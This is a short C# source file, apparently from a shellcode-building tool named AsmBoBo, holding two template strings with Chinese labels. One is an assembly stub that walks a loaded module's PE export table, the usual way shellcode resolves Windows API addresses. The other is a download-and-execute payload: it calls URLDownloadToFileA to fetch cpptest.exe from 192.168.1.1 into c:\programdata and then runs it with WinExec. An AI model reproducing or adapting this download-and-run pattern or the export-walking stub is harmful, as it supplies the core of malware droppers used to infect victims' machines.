using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace AsmBoBo
{
    class template
    {
        public static string AsmCode =	
			     "[汇编输入示例代码如下：]                             \n\n" +
                 "xor edx, edx                                  \n" +
				 "mov edx, eax                                  \n" +
				 "mov edi, eax                                  \n\n" +

				 "xor eax, eax								    \n" +
				 "mov eax, [edx + 3ch]						    \n" +
				 "mov eax, [eax + edx + 78h]				    \n" +
				 "add eax, edx                                  \n\n" +

				 "mov ebx, [eax+20h]							\n" +
				 "add ebx, edx									\n" +
				 "mov esi, ebx                                  \n" +
				 "xor ecx,ecx                                   \n";
		public static string cppcode =
			"[输入示例代码如下：]                             \n\n" +
			"*注意括号，使用英文括号*                                \n\n" +
			"[typdef]                                             \n" +
			"typdef func URLDownloadToFileA module urlmon.dll     \n" +
			"typdef func WinExec module kernel32.dll              \n\n" +
			"                                                     \n" +
			"[main]                                               \n" +
			"URLDownloadToFileA(NULL,\"http://192.168.1.1/cpptest.exe\",\"c:\\programdata\\mydir\\cpptest.exe\",0, NULL);\n" +
			"WinExec(\"c:\\programdata\\mydir\\cpptest.exe\",1);";
    
	}
}
